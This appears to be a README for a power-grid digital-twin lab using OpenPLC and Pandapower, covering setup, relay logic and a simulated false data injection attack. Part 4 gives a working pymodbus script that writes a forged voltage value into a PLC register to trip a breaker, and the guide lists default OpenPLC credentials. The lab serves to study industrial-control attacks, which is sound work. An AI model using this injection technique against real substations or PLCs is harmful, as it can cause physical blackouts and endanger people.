# TRINETRA: Step-by-Step Execution & Cyber-Attack Guide

This guide details exactly how to start the full TRINETRA Digital Twin, construct a valid cyber-physical grid, deploy the logic via OpenPLC, and execute a false data injection (FDIA) attack to verify the physical blackout.

---

## Part 1: Starting the Engine & UI

1.  **Terminal 1 (Backend - Physics & Modbus Engine):**
    ```bash
    cd ~/project-trinetra/backend-orchestrator
    source venv/bin/activate
    uvicorn main:app --host 0.0.0.0 --port 8000
    ```

2.  **Terminal 2 (Frontend - React Builder):**
    ```bash
    cd ~/project-trinetra/digital-twin-builder
    npm run dev
    ```

3.  Open your browser to `http://localhost:5173`.

---

## Part 2: Building the Topology

To observe a blackout, you must build a grid where a single breaker controls flow to a load.

1.  **Draw the Physics:**
    *   Drag **Bus 1** and **Bus 2** onto the canvas.
    *   Drag **External Grid** and connect it to **Bus 1**.
    *   Drag **Circuit Breaker** and connect it *between* Bus 1 and Bus 2.
    *   Drag **Load** and connect it to **Bus 2**.
2.  **Draw the Cyber:**
    *   Drag an **IED** node and connect it to the **Circuit Breaker**.
3.  **Configure ST Logic (Optional but Recommended):**
    *   Double-click the **IED**. You can leave the ST Code box blank (it will auto-generate the Distance Protection logic), or you can paste the strict IEC 61131-3 logic provided in the OpenPLC Integration Guide.
    *   **Sample Confirmed ST Code:**
        ```pascal
        PROGRAM user_distance_relay
          VAR
            V_scaled AT %MW0 : UINT := 23000;
            I_scaled AT %MW1 : UINT := 1520;
            scan_count AT %QW24 : INT := 0;
            Trip_Command_0 AT %QX0.0 : BOOL := FALSE;
          END_VAR

          IF scan_count >= 32767 THEN
            scan_count := 0;
          ELSE
            scan_count := scan_count + 1;
          END_IF;

          IF V_scaled > 25000 THEN
            Trip_Command_0 := TRUE;
          ELSE
            Trip_Command_0 := FALSE;
          END_IF;

        END_PROGRAM

        CONFIGURATION Config0
          RESOURCE Res0 ON PLC
            TASK Task0(INTERVAL := T#500ms, PRIORITY := 0);
            PROGRAM Inst0 WITH Task0 : user_distance_relay;
          END_RESOURCE
        END_CONFIGURATION
        ```

---

## Part 3: Deployment & Verification

1.  Click **Deploy Architecture** in the React UI.
2.  Switch back to **Terminal 1**. Watch the logs.
    *   You will see the Docker container mapping.
    *   The system will pause for ~30 seconds while `matiec` compiles the `.st` code into C-code.
    *   You will see the Modbus connection established.
3.  **Steady State:** The physics engine will begin its 500ms loops. You will see continuous logs indicating normal flow:
    ```
    INFO - Physics: Voltage=230.0000 pu | Breaker CLOSED | Grid Normal
    ```

### Verify memory in OpenPLC (Optional)
*   Open a new browser tab to `http://localhost:8080`.
*   Login (`openplc` / `openplc`).
*   Go to **Monitoring**. You will see `V_scaled` happily holding exactly `23000` (which is Pandapower's 230V scaled up).

---

## Part 4: Executing the False Data Injection Attack

You will now act as a rogue actor on the substation network. We will inject a fake analog value into OpenPLC's memory, forcing it to trip the breaker.

1.  Open **Terminal 3**.
2.  Create the attack script:
    ```bash
    cat << 'EOF' > /tmp/hack.py
    from pymodbus.client import ModbusTcpClient
    
    # 5020 is the default external Modbus port mapped to the first IED
    c = ModbusTcpClient("127.0.0.1", port=5020) 
    c.connect()
    
    # Inject 260V (26000) into Holding Register 0 (%MW0)
    c.write_register(0, 26000) 
    
    print("ATTACK SUCCESS: Faked voltage telemetry set to 260V")
    c.close()
    EOF
    ```
3.  **Execute the attack:**
    ```bash
    python3 /tmp/hack.py
    ```

## Part 5: Observing the Physical Blackout

Instantly switch back to **Terminal 1**. 

Because `%MW0` is now 26000, the OpenPLC logic (`IF V_scaled > 25000 THEN Trip_Command_0 := TRUE;`) will immediately fire. 

The Python orchestrator will read `%QX0.0`, see that it is `TRUE`, and sever the Pandapower switch. Your terminal will instantly change to:

```text
BREAKER breaker_1: TRIPPED (PLC commanded) -> Switch open -> Flow severed
Physics: Voltage=0.0000 pu [BREAKER TRIPPED - PLC protection relay OPEN]
```

Congratulations. You have successfully simulated a cyber-induced physical outage.
